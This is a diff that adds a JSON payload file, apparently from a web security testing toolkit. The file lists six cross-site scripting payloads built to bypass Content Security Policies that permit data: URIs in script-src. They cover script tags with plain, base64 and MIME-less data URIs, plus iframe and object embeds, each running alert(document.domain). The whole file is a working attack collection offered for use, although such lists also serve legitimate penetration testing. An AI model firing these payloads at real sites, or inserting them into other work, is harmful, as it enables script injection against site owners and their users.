@@ -1,0 +1,62 @@
+{
+  "category": "csp_bypass",
+  "subcategory": "data_uri",
+  "description": "Payloads for CSPs allowing data: in script-src — script execution via data URIs",
+  "count": 6,
+  "payloads": [
+    {
+      "id": "csp-data-001",
+      "category": "csp_bypass",
+      "subcategory": "data_uri",
+      "payload": "<script src='data:text/javascript,alert(document.domain)'></script>",
+      "description": "Script src data URI — plaintext JS",
+      "technique": "data_uri",
+      "csp_bypass": "data: in script-src allows script loading via data URI"
+    },
+    {
+      "id": "csp-data-002",
+      "category": "csp_bypass",
+      "subcategory": "data_uri",
+      "payload": "<script src='data:text/javascript;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='></script>",
+      "description": "Script src data URI — base64 encoded alert(document.domain)",
+      "technique": "data_uri",
+      "csp_bypass": "data: with base64 encoding bypasses keyword filters"
+    },
+    {
+      "id": "csp-data-003",
+      "category": "csp_bypass",
+      "subcategory": "data_uri",
+      "payload": "<script src='data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='></script>",
+      "description": "Script src data URI — no MIME type specified",
+      "technique": "data_uri",
+      "csp_bypass": "data: without explicit MIME type still executes as JS"
+    },
+    {
+      "id": "csp-data-004",
+      "category": "csp_bypass",
+      "subcategory": "data_uri",
+      "payload": "<script src='data:application/javascript,alert(document.domain)'></script>",
+      "description": "Script src data URI — application/javascript MIME",
+      "technique": "data_uri",
+      "csp_bypass": "data: with application/javascript MIME type"
+    },
+    {
+      "id": "csp-data-005",
+      "category": "csp_bypass",
+      "subcategory": "data_uri",
+      "payload": "<iframe src='data:text/html,<script>alert(document.domain)</script>'></iframe>",
+      "description": "iframe data URI — creates new browsing context",
+      "technique": "data_uri",
+      "csp_bypass": "data: iframe creates context that may inherit permissive CSP"
+    },
+    {
+      "id": "csp-data-006",
+      "category": "csp_bypass",
+      "subcategory": "data_uri",
+      "payload": "<object data='data:text/html,<script>alert(document.domain)</script>'></object>",
+      "description": "Object data URI — plugin-context script execution",
+      "technique": "data_uri",
+      "csp_bypass": "data: in object creates embedded HTML context"
+    }
+  ]
+}
